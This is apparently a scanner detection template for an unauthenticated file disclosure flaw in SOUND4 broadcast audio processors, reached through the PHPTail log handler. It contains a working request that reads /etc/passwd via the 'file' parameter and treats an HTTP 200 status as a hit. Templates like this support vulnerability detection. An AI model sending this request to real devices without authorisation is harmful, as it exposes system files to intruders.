id: sound4-file-disclosure
brief:
    title: SOUND4 IMPACT/FIRST/PULSE/Eco <=2.x (PHPTail) Unauthenticated File Disclosure
    by: arafatansari
    level: medium
    about: The application suffers from an unauthenticated file disclosure vulnerability. Using the 'file' GET parameter attackers can disclose arbitrary files on the affected device and disclose sensitive an...
    label:
        - packetstorm
        - lfi
        - sound4
        - unauth
        - disclosure
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/cgi-bin/loghandler.php?ajax=251&file=/mnt/old-root/etc/passwd'
      signs:
        - "on": status
          status:
            - 200
